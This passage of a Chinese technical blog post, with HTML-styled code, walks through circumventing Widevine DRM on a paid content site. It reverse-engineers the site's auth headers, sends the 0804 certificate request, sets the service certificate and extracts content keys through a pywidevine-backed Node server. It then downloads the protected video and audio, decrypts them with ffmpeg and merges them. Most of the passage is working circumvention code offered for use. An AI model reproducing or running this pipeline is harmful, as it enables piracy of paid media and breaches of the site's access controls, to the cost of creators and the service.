254);">return</span> axios.<span style="color: rgb(255, 255, 182);">post</span>(serverAddr + <span style="color: rgb(168, 255, 96);">'/getKeys'</span>, querystring.<span style="color: rgb(255, 255, 182);">stringify</span>({            url,            pssh,            headers        }))    }<br />    <span style="color: rgb(150, 203, 254);">return</span> {        close: closeFunc,        port: port,<br />        status: <span style="color: rgb(168, 255, 96);">"success"</span>,        getKeys: getKeys    }}<br /><span style="color: rgb(150, 203, 254);">function</span> <span style="color: rgb(255, 255, 182);">checkPortOccupy</span>(port) {<br />    <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">Promise</span>((resolve, reject) =&gt; {<br />        <span style="color: rgb(150, 203, 254);">const</span> server = net.<span style="color: rgb(255, 255, 182);">createConnection</span>({ port });<br />        server.<span style="color: rgb(255, 255, 182);">on</span>(<span style="color: rgb(168, 255, 96);">'connect'</span>, () =&gt; {<br />            server.<span style="color: rgb(255, 255, 182);">end</span>();<br />            <span style="color: rgb(255, 255, 182);">resolve</span>(<span style="color: rgb(198, 197, 254);">true</span>);        });<br />        server.<span style="color: rgb(255, 255, 182);">on</span>(<span style="color: rgb(168, 255, 96);">'error'</span>, () =&gt; {<br />            <span style="color: rgb(255, 255, 182);">resolve</span>(<span style="color: rgb(198, 197, 254);">false</span>);        });    });}<br /><span style="color: rgb(150, 203, 254);">async</span> <span style="color: rgb(150, 203, 254);">function</span> <span style="color: rgb(255, 255, 182);">getPortFree</span>() {<br />    <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">Promise</span>(res =&gt; {<br />        <span style="color: rgb(150, 203, 254);">const</span> srv = net.<span style="color: rgb(255, 255, 182);">createServer</span>();<br />        srv.<span style="color: rgb(255, 255, 182);">listen</span>(<span style="color: rgb(255, 115, 253);">0</span>, () =&gt; {<br />            <span style="color: rgb(150, 203, 254);">const</span> port = srv.<span style="color: rgb(255, 255, 182);">address</span>().port<br />            srv.<span style="color: rgb(255, 255, 182);">close</span>((err) =&gt; <span style="color: rgb(255, 255, 182);">res</span>(port))        });    })<br />}</code></pre><p>由于我们还没上传到npm，这个时候需要通过本地软连接测试，修改package.json中的name属性<br />然后在库项目输入<code style="font-family: SFMono-Regular, Consolas, ;">npm link</code><br />紧接着在测试的项目中输入 <code style="font-family: SFMono-Regular, Consolas, ;">npm link 项目名</code>即可实现本地导入<br />接下来我们写一下测试代码，其中node-widevine-decrypt就是我软连接库的名字</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">    <span style="color: rgb(150, 203, 254);">const</span> { openCDMServer } = require(<span style="color: rgb(168, 255, 96);">'node-widevine-decrypt'</span>)<br />    <span style="color: rgb(150, 203, 254);">const</span> path = require(<span style="color: rgb(168, 255, 96);">'path'</span>)<br />    <span style="color: rgb(150, 203, 254);">async</span> <span style="color: rgb(150, 203, 254);">function</span> <span style="color: rgb(255, 255, 182);">main</span>() {<br />        <span style="color: rgb(150, 203, 254);">const</span> { getKeys, port, status } = <span style="color: rgb(150, 203, 254);">await</span> <span style="color: rgb(255, 255, 182);">openCDMServer</span>({<br />            wvdFullPath: path.<span style="color: rgb(255, 255, 182);">join</span>(__filename, <span style="color: rgb(168, 255, 96);">'../aosp.wvd'</span>)        })<br />        <span style="color: rgb(150, 203, 254);">if</span> (status === <span style="color: rgb(168, 255, 96);">'success'</span>) {<br />            <span style="color: rgb(150, 203, 254);">const</span> {data} =<span style="color: rgb(150, 203, 254);">await</span> <span style="color: rgb(255, 255, 182);">getKeys</span>(<span style="color: rgb(168, 255, 96);">"URL地址"</span>,<span style="color: rgb(168, 255, 96);">"pssh数据"</span>)<br />            <span style="color: rgb(198, 197, 254);">console</span>.<span style="color: rgb(255, 255, 182);">log</span>(data)<br />        } <span style="color: rgb(150, 203, 254);">else</span> {<br />            <span style="color: rgb(198, 197, 254);">console</span>.<span style="color: rgb(255, 255, 182);">log</span>(<span style="color: rgb(168, 255, 96);">'server error'</span>)        }    }<br />    <span style="color: rgb(255, 255, 182);">main</span>()</code></pre><p>跑一下看看，发现成功解密~<br /><img border="0" class="rich_pages wxw-img" src="https://wechat2rss.xlab.app/img-proxy/?k=729fb7f1&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJl9l1BVE6U8uVxzjq9IQgOoTekLzORx0qQvF654ibtqjwDUib64yRibLAjrAMMdUCvy9Rcq9vKibaXjw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="533" /></p><p><br /><span>那接下来的问题就是我们该怎么读取OF网站的密钥了</span></p><p>首先需要解密头</p><p>直接逐步定位打到了</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">              , <span style="color: rgb(255, 255, 182);">Pe</span> = e=&gt;{<br />                <span style="color: rgb(150, 203, 254);">try</span> {<br />                    <span style="color: rgb(150, 203, 254);">const</span> t = {<br />                        ...(<span style="color: rgb(255, 115, 253);">0</span>,                        F.A)(e)                    };<br />                    t[<span style="color: rgb(168, 255, 96);">"app-token"</span>] = te;<br />                    <span style="color: rgb(150, 203, 254);">const</span> s = V.A.getters[<span style="color: rgb(168, 255, 96);">"auth/authUserId"</span>];<br />                    s &amp;&amp; (t[<span style="color: rgb(168, 255, 96);">"user-id"</span>] = s),<br />                    t[<span style="color: rgb(168, 255, 96);">"x-bc"</span>] = <span style="color: rgb(255, 255, 182);">fe</span>(),<br />                    t[<span style="color: rgb(168, 255, 96);">"x-of-rev"</span>] = <span style="color: rgb(168, 255, 96);">"202406261341-9a802bb7ea"</span>;<br />                    <span style="color: rgb(150, 203, 254);">const</span> {hash: r} = V.A.state.hash;<br />                    <span style="color: rgb(150, 203, 254);">return</span> r &amp;&amp; (t[<span style="color: rgb(168, 255, 96);">"x-hash"</span>] = r),                    t<br />                } <span style="color: rgb(150, 203, 254);">catch</span> (t) {<br />                    <span style="color: rgb(198, 197, 254);">console</span>.<span style="color: rgb(255, 255, 182);">error</span>(t)                }<br />                <span style="color: rgb(150, 203, 254);">return</span> {}<br />            }</code></pre><p>t初始化是sign和time</p><p>然后设置app-token，这里跟其他一致</p><p>user-id，设置用户id，等价于cookie的auth_id，也基本一致</p><p>t["x-bc"] = fe() 提取bcToken，老生常谈</p><p>t["x-of-rev"] = "202406261341-9a802bb7ea";固定值</p><p>const {hash: r} = V.A.state.hash; 从https://cdn2.OF网站.com/hash/中读取</p><p>没难度啊我靠</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">x</span>-hash: <span style="color: rgb(168, 255, 96);">"mkVyQlWEXk/Vb0n/4iia1HdR+AeHJrzzR27MA+8="</span><br /><span style="color: rgb(150, 203, 254);">x</span>-of-rev:<span style="color: rgb(168, 255, 96);">"202406261341-9a802bb7ea"</span></code></pre><p>这两个参数要保持最新，如果旧版本的请求没补这两个或者hash过期</p><p>会导致请求正常但是DRM的Cookies是假的</p><p>好心机</p><p>但是直接往认证服务器发送包依然失败</p><p>这部分卡了我很久</p><p>只能去参考od-drm项目</p><p>找到了</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">                <span style="color: rgb(150, 203, 254);">var</span> resp1 = PostData(licenceURL, drmHeaders, <span style="color: rgb(150, 203, 254);">new</span> byte[] { <span style="color: rgb(255, 115, 253);">0x08</span>, <span style="color: rgb(255, 115, 253);">0x04</span> });<br />                <span style="color: rgb(150, 203, 254);">var</span> certDataB64 = Convert.ToBase64String(resp1);<br />                <span style="color: rgb(150, 203, 254);">var</span> cdm = <span style="color: rgb(150, 203, 254);">new</span> CDMApi();<br />                <span style="color: rgb(150, 203, 254);">var</span> challenge = cdm.GetChallenge(pssh, certDataB64, <span style="color: rgb(198, 197, 254);">false</span>, <span style="color: rgb(198, 197, 254);">false</span>);<br />                <span style="color: rgb(150, 203, 254);">var</span> resp2 = PostData(licenceURL, drmHeaders, challenge);<br />                <span style="color: rgb(150, 203, 254);">var</span> licenseB64 = Convert.ToBase64String(resp2);                cdm.ProvideLicense(licenseB64);<br />                List&lt;ContentKey&gt; keys = cdm.GetKeys();</code></pre><p>可以看到先提交了一个0804，然后设置证书再处理解密部分</p><p>观察OF网站的抓包也确实存在两次提交</p><p>因为我一直在搞解密部分大意了，没有闪！</p><p>关于设置服务器证书pywidevine也有函数，我们查看源码可以找到<code style="font-family: SFMono-Regular, Consolas, ;">set_service_certificate</code>函数</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">        Set a Service Privacy Certificate <span style="color: rgb(150, 203, 254);">for</span> <span style="color: rgb(255, 255, 182);">Privacy</span> Mode. (optional but recommended)<br />        The Service Certificate is used to encrypt Client IDs <span style="color: rgb(150, 203, 254);">in</span> Licenses. This is also<br />        known <span style="color: rgb(150, 203, 254);">as</span> Privacy Mode and may be required <span style="color: rgb(150, 203, 254);">for</span> <span style="color: rgb(255, 255, 182);">some</span> services or <span style="color: rgb(150, 203, 254);">for</span> <span style="color: rgb(255, 255, 182);">some</span> devices.<br />        Chrome CDM requires it <span style="color: rgb(150, 203, 254);">as</span> of the enforcement of <span style="color: rgb(255, 255, 182);">VMP</span> (Verified Media Path).<br />        We reject direct DrmCertificates <span style="color: rgb(150, 203, 254);">as</span> they <span style="color: rgb(150, 203, 254);">do</span> not have signature verification and        cannot be verified. You must provide a SignedDrmCertificate or a SignedMessage        containing a SignedDrmCertificate.        Parameters:            session_id: Session identifier.<br />            certificate: <span style="color: rgb(255, 255, 182);">SignedDrmCertificate</span> (or SignedMessage containing one) <span style="color: rgb(150, 203, 254);">in</span> Base64<br />                or Bytes form obtained from the Service. <span style="color: rgb(198, 197, 254);">Some</span> services have their own,<br />                but most <span style="color: rgb(150, 203, 254);">use</span> the common privacy cert, (common_privacy_cert). If <span style="color: rgb(198, 197, 254);">None</span>, it                will remove the current certificate.        Raises:            InvalidSession: If the Session identifier is invalid.<br />            DecodeError: If the certificate could not be parsed <span style="color: rgb(150, 203, 254);">as</span> a SignedDrmCertificate                nor a SignedMessage containing a SignedDrmCertificate.            SignatureMismatch: If the Signature of the SignedDrmCertificate does not<br />                <span style="color: rgb(150, 203, 254);">match</span> the underlying DrmCertificate.<br />        Returns the Service Provider ID of the verified DrmCertificate <span style="color: rgb(150, 203, 254);">if</span> successful.<br />        If certificate is <span style="color: rgb(198, 197, 254);">None</span>, it will <span style="color: rgb(150, 203, 254);">return</span> the now-unset certificate<span style="color: rgb(198, 197, 254);">'s</span> Provider ID,<br />        or <span style="color: rgb(198, 197, 254);">None</span> <span style="color: rgb(150, 203, 254);">if</span> no certificate was set yet.</code></pre><p>那我们就继续研究一下原网页的代码，看看0801哪里来的</p><p>之前我们分析getLicense我们知道了接受消息的在</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">                u.<span style="color: rgb(255, 255, 182);">addEventListener</span>(<span style="color: rgb(168, 255, 96);">"message"</span>, (e=&gt;{<br />                    c.<span style="color: rgb(255, 255, 182);">trigger</span>({<br />                        type: <span style="color: rgb(168, 255, 96);">"keymessage"</span>,                        messageEvent: e                    }),<br />                    <span style="color: rgb(168, 255, 96);">"license-request"</span> !== e.messageType &amp;&amp; <span style="color: rgb(168, 255, 96);">"license-renewal"</span> !== e.messageType || <span style="color: rgb(255, 255, 182);">a</span>(o, e.message, d).<span style="color: rgb(255, 255, 182);">then</span>((e=&gt;{<br />                        <span style="color: rgb(255, 255, 182);">r</span>(u.<span style="color: rgb(255, 255, 182);">update</span>(e).<span style="color: rgb(255, 255, 182);">then</span>((()=&gt;{<br />                            c.<span style="color: rgb(255, 255, 182);">trigger</span>({<br />                                type: <span style="color: rgb(168, 255, 96);">"keysessionupdated"</span>,                                keySession: u                            })                        }<br />                        )).<span style="color: rgb(150, 203, 254);">catch</span>((e=&gt;{<br />                            <span style="color: rgb(150, 203, 254);">const</span> t = {<br />                                errorType: s.<span style="color: rgb(150, 203, 254);">default</span>.Error.EMEFailedToUpdateSessionWithReceivedLicenseKeys,                                keySystem: m                            };<br />                            <span style="color: rgb(255, 255, 182);">l</span>(e, t)                        }                        )))                    }<br />                    )).<span style="color: rgb(150, 203, 254);">catch</span>((e=&gt;{<br />                        <span style="color: rgb(255, 255, 182);">p</span>(e)                    }                    ))<br />                }</code></pre><p>查找文档https://www.w3.org/TR/encrypted-media/</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">generateRequest<br />Generates a license request <span style="color: rgb(150, 203, 254);">based </span>on the initData. A message of type <span style="color: rgb(168, 255, 96);">"license-request"</span> <span style="color: rgb(150, 203, 254);">or </span><span style="color: rgb(168, 255, 96);">"individualization-request"</span> will always <span style="color: rgb(150, 203, 254);">be </span>queued if the algorithm succeeds <span style="color: rgb(150, 203, 254);">and </span>the promise is resolved.Parameter        Type        Nullable        Optional        DescriptioninitDataType        DOMString        ✘        ✘        The Initialization Data Type of the initData.<br />initData        <span style="color: rgb(150, 203, 254);">BufferSource </span>       ✘        ✘        Initialization Data</code></pre><p>根据文档的提示，生成我们可以定位到</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">                    u.generateRequest(n, i).<span style="color: rgb(150, 203, 254);">catch</span>((e=&gt;{<br />                        <span style="color: rgb(150, 203, 254);">const</span> t = {<br />                            errorType: s.<span style="color: rgb(198, 197, 254);">default</span>.Error.EMEFailedToGenerateLicenseRequest,                            keySystem: m                        };                        l(e, t),<br />                        p(<span style="color: rgb(168, 255, 96);">"Unable to create or initialize key session"</span>)<br />                    }</code></pre><p>关于到底这两个是否有关联可以下断在u.generateRequest调用时将函数置为空函数()=&gt;{}，可以发现接收消息没有触发，证明了这两个函数没有关联</p><p>其中n是cenc，i是字节，我们一路往上堆栈回溯可以找到</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">            if (i) {                e[i] = {                    attributes: n                };<br />                const r = Te(t, <span style="color: rgb(168, 255, 96);">"cenc:pssh"</span>)[0];                if (r) {                    const t = Ie(r);                    e[i].pssh = t &amp;&amp; p(t)                }<br />            }</code></pre><p>其中p是将字符串转为字节数组</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">        <span style="color: rgb(150, 203, 254);">function</span> <span style="color: rgb(255, 255, 182);">p</span>(e) {<br />            <span style="color: rgb(150, 203, 254);">for</span> (<span style="color: rgb(150, 203, 254);">var</span> t = <span style="color: rgb(255, 255, 182);">m</span>(e), n = <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">Uint8Array</span>(t.length), i = <span style="color: rgb(255, 115, 253);">0</span>; i &lt; t.length; i++)<br />                n[i] = t.<span style="color: rgb(255, 255, 182);">charCodeAt</span>(i);<br />            <span style="color: rgb(150, 203, 254);">return</span> n<br />        }</code></pre><p>根据调试首先传入的是wpd中较短的pssh，然后得到0804提交再获取证书</p><p>但是问题来了</p><p>0804到底怎么生成的？</p><p>我研究了几天还是没有得到答案</p><p>于是到处找人寻味</p><p>直到在forum.videohelp.com论坛得到了larley大神的解答！</p><p>https://forum.videohelp.com/threads/415095-How-to-simulate-the-generateRequest-function-through-python</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">The long PSSH <span style="color: rgb(150, 203, 254);">is</span> used <span style="color: rgb(150, 203, 254);">for</span> Microsoft<span style="color: rgb(168, 255, 96);">'s PlayReady and then short one is for Google'</span>s Widevine (that<span style="color: rgb(168, 255, 96);">'s what you'</span>re going <span style="color: rgb(150, 203, 254);">to</span> want <span style="color: rgb(150, 203, 254);">to</span> use).<br />The <span style="color: rgb(168, 255, 96);">'08 04'</span> (<span style="color: rgb(150, 203, 254);">or</span> CAQ= <span style="color: rgb(150, 203, 254);">is</span> base64) (<span style="color: rgb(150, 203, 254);">or</span> <span style="color: rgb(168, 255, 96);">'\x08\x04'</span> <span style="color: rgb(150, 203, 254);">in</span> python) <span style="color: rgb(150, 203, 254);">is</span> a fixed data value that can be sent <span style="color: rgb(150, 203, 254);">to</span> the same server (even same URL <span style="color: rgb(150, 203, 254);">and</span> <span style="color: rgb(255, 115, 253);">99</span>% <span style="color: rgb(150, 203, 254);">of</span> the time even the same headers) from which you will receive your license.</code></pre><p>0804竟然是generateRequest返回的固定值！</p><p>我在https://integration.widevine.com/diagnostics的生成widevine pssh试了几组</p><p>都返回了0804！</p><p>那么一切就通顺了</p><p>首先根据较短的pssh获得0804</p><p>然后将0804上传得到certData证书</p><p>再设置certData证书</p><p>然后上传pssh得到正确key</p><p>理论建立完毕</p><p>实践开始！</p><p>我们接下来给cdmServer拓展一下设置证书，在node部分拿到证书就可以了</p><p>剩下的不算很难了，我就只罗列一些关键的代码</p><p>获取pssh，这里我偷懒排序取了个最小pssh</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">function</span> <span style="color: rgb(255, 255, 182);">getPSSH</span>(url, Cookie) {<br />  <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">Promise</span>(<span style="color: rgb(150, 203, 254);">async</span> (resolve, reject) =&gt; {<br />    <span style="color: rgb(150, 203, 254);">try</span> {<br />      <span style="color: rgb(150, 203, 254);">const</span> { data } = <span style="color: rgb(150, 203, 254);">await</span> axios.<span style="color: rgb(255, 255, 182);">request</span>({<br />        method: <span style="color: rgb(168, 255, 96);">'get'</span>,        url: url,        headers: {<br />          <span style="color: rgb(168, 255, 96);">'Cookie'</span>: <span style="color: rgb(255, 255, 182);">Cookie</span>        },      })<br />      <span style="color: rgb(150, 203, 254);">const</span> reg = <span style="color: rgb(233, 192, 98);">/&lt;cenc\:pssh&gt;(.*)&lt;\/cenc\:pssh&gt;/g</span><br />      <span style="color: rgb(150, 203, 254);">const</span> psshArray = <span style="color: rgb(255, 255, 182);">sortArray</span>([...data.<span style="color: rgb(255, 255, 182);">matchAll</span>(reg)].<span style="color: rgb(255, 255, 182);">map</span>(item =&gt; item[<span style="color: rgb(255, 115, 253);">1</span>]))[<span style="color: rgb(255, 115, 253);">0</span>]<br />      <span style="color: rgb(255, 255, 182);">resolve</span>(psshArray)<br />    } <span style="color: rgb(150, 203, 254);">catch</span> (error) {<br />      <span style="color: rgb(198, 197, 254);">console</span>.<span style="color: rgb(255, 255, 182);">log</span>(error)<br />      <span style="color: rgb(255, 255, 182);">reject</span>()    }  })<br />}</code></pre><p>然后获取证书</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">                  <span style="color: rgb(150, 203, 254);">const</span> buf = <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">ArrayBuffer</span>(<span style="color: rgb(255, 115, 253);">2</span>)<br />                  <span style="color: rgb(150, 203, 254);">let</span> view = <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">Int8Array</span>(buf);<br />                  view[<span style="color: rgb(255, 115, 253);">0</span>] = <span style="color: rgb(255, 115, 253);">8</span><br />                  view[<span style="color: rgb(255, 115, 253);">1</span>] = <span style="color: rgb(255, 115, 253);">4</span><br />                  <span style="color: rgb(150, 203, 254);">const</span> certificate = <span style="color: rgb(150, 203, 254);">await</span> <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">Promise</span>((resolve) =&gt; {<br />                    axios.<span style="color: rgb(255, 255, 182);">post</span>(cdmServer, buf, {                      headers: cdmHeader,<br />                      responseType: <span style="color: rgb(168, 255, 96);">"arraybuffer"</span><br />                    }).<span style="color: rgb(255, 255, 182);">then</span>((response) =&gt; {<br />                      <span style="color: rgb(255, 255, 182);">resolve</span>(response.data.<span style="color: rgb(255, 255, 182);">toString</span>(<span style="color: rgb(168, 255, 96);">'hex'</span>))<br />                    }).<span style="color: rgb(255, 255, 182);">catch</span>((err) =&gt; {<br />                      <span style="color: rgb(198, 197, 254);">console</span>.<span style="color: rgb(255, 255, 182);">log</span>(<span style="color: rgb(168, 255, 96);">'err'</span>, err)                    })<br />                  })</code></pre><p>在服务器端判断是否有证书，有的话就设置</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">    certificate= form.get(<span style="color: rgb(168, 255, 96);">"certificate"</span>)<br />    <span style="color: rgb(150, 203, 254);">if</span> <span style="color: rgb(150, 203, 254);">not</span> certificate <span style="color: rgb(150, 203, 254);">is</span> <span style="color: rgb(198, 197, 254);">None</span>:         certificate=bytes.fromhex(certificate)<br />         cdmInstance.set_service_certificate(cdm_session_id,certificate)</code></pre><p>那么我们就可以拿到密钥了，先在js创建一个密钥数组</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">    <span style="color: rgb(150, 203, 254);">const</span> keyList = data.data.<span style="color: rgb(255, 255, 182);">map</span>((item) =&gt; item.key).<span style="color: rgb(255, 255, 182);">map</span>((key) =&gt; {<br />      <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(168, 255, 96);">'-decryption_key '</span> + key<br />    })</code></pre><p>分别解密mp4和m4a</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">    <span style="color: rgb(150, 203, 254);">const</span> fileList = <span style="color: rgb(150, 203, 254);">await</span> <span style="color: rgb(255, 255, 182);">downloadDRMViedeo</span>(mpd, baseDir, mediaItem.id, <span style="color: rgb(255, 255, 182);">Cookie</span>)<br />    <span style="color: rgb(150, 203, 254);">const</span> mergeFile = []<br />    <span style="color: rgb(150, 203, 254);">for</span> (<span style="color: rgb(150, 203, 254);">let</span> index = <span style="color: rgb(255, 115, 253);">0</span>; index &lt; fileList.length; index++) {<br />      <span style="color: rgb(150, 203, 254);">const</span> filePath = fileList[index]<br />      <span style="color: rgb(150, 203, 254);">await</span> <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">Promise</span>((resolve) =&gt; {<br />        <span style="color: rgb(255, 255, 182);">ffmpeg</span>().<span style="color: rgb(255, 255, 182);">input</span>(baseDir + <span style="color: rgb(168, 255, 96);">'/'</span> + filePath).<span style="color: rgb(255, 255, 182);">inputOptions</span>([          ...keyList,<br />        ]).<span style="color: rgb(255, 255, 182);">audioCodec</span>(<span style="color: rgb(168, 255, 96);">'copy'</span>).<span style="color: rgb(255, 255, 182);">videoCodec</span>(<span style="color: rgb(168, 255, 96);">'copy'</span>).<span style="color: rgb(255, 255, 182);">output</span>(baseDir + <span style="color: rgb(168, 255, 96);">'/drm_'</span> + filePath).<span style="color: rgb(255, 255, 182);">on</span>(<span style="color: rgb(168, 255, 96);">"end"</span>, () =&gt; {<br />          mergeFile.<span style="color: rgb(255, 255, 182);">push</span>(baseDir + <span style="color: rgb(168, 255, 96);">'/drm_'</span> + filePath)<br />          <span style="color: rgb(255, 255, 182);">resolve</span>();<br />        }).<span style="color: rgb(255, 255, 182);">run</span>()      })<br />    }</code></pre><p>然后将两个视频合并到一起就可以了</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 